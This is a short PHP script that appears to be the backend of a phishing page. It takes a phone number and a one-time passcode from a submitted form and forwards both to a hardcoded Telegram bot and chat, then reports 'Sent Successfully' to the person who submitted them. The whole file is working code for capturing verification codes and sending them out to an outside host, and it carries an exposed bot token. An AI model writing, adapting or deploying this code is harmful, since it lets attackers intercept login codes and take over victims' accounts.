<?php

$botToken="8785026329:AAFSOJ59DWj4AiJnCUNTu8xL2H-fTd_D1D8";
$chatId="5971795563";

$number=$_POST['number'] ?? '';
$otp=$_POST['otp'] ?? '';

$message="New OTP Submission:\n";
$message.="Phone: ".$number."\n";

if(!empty($otp)){
$message.="OTP: ".$otp;
}

$url="https://api.telegram.org/bot".$botToken."/sendMessage";

$data=[
"chat_id"=>$chatId,
"text"=>$message
];

$options=[
"http"=>[
"header"=>"Content-type: application/x-www-form-urlencoded\r\n",
"method"=>"POST",
"content"=>http_build_query($data),
]
];

$context=stream_context_create($options);

file_get_contents($url,false,$context);

echo "Sent Successfully";

?>
